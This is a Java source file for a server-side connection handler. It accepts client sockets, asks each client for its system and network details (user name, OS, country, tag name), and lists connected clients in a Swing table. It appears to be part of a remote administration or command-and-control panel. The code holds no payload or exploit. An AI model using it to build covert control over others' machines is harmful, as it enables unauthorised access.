package Connections;

import GUI.Main;
import Information.Action;
import Information.NetworkInformation;
import Information.SystemInformation;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;

public class Connection implements Runnable {
    private final ServerSocket server;
    private final ExecutorService executor;
    private final ConcurrentHashMap<Socket, Streams> dialog;

    public Connection(ServerSocket server, ExecutorService executor, ConcurrentHashMap<Socket, Streams> dialog) {
        if (server == null || executor == null || dialog == null) throw new IllegalArgumentException();
        this.server = server;
        this.executor = executor;
        this.dialog = dialog;
    }

    @Override
    public void run() {
        try {
            Socket socket = server.accept();
            checkIfExistsAndRemove(socket);
            if (dialog.putIfAbsent(socket, new Streams(socket)) == null) {
                System.out.println("Connected to: " + socket.getRemoteSocketAddress());
                Streams stream = dialog.get(socket);
                SystemInformation sysInfo = (SystemInformation) stream.sendAndReadJSON(Action.SYS_INFO);
                stream.setTempSystemInformation(sysInfo);
                NetworkInformation netInfo = (NetworkInformation) stream.sendAndReadJSON(Action.NET_INFO);
                stream.setTempNetworkInformation(netInfo);
                SwingUtilities.invokeLater(() -> {
                    JTable connectionsTable = Main.gui.getConnectionsTable();
                    int existingClientRow = checkForExistingClient(connectionsTable, socket);
                    if (existingClientRow != -1) {
                        connectionsTable.getModel().setValueAt("Connected", existingClientRow, 5);
                    } else {
                        String[] tableRow = new String[]{socket.getInetAddress().toString(),
                                netInfo.USER_COUNTRY(),
                                sysInfo.TAG_NAME(),
                                sysInfo.USER_NAME(),
                                sysInfo.OPERATING_SYSTEM(),
                                "Connected"
                        };
                        DefaultTableModel model = (DefaultTableModel) Main.gui.getConnectionsTable().getModel();
                        model.addRow(tableRow);
                    }
                });

            }
            executor.submit(new Connection(server, executor, dialog));
        } catch (Exception e) {
            System.out.println("Exception on client");
            e.printStackTrace();
            executor.submit(new Connection(server, executor, dialog));
        }
    }

    // just search in map
    private void checkIfExistsAndRemove(Socket socket){
        for (Map.Entry<Socket, Streams> entry : Main.server.getMap().entrySet()) {
            if (entry.getKey().getInetAddress().toString().equals(socket.getInetAddress().toString())){
                dialog.remove(entry.getKey());
            }
        }
    }

    // search on JTable
    private int checkForExistingClient(JTable connectionsTable, Socket socket) {
        TableModel connectionsTableModel = connectionsTable.getModel();
        for (int i = 0; i < connectionsTable.getModel().getRowCount(); i++) {
            if (socket.getInetAddress().toString().equals(connectionsTableModel.getValueAt(i, 0))) {
                return i;
            }
        }
        return -1;
    }

}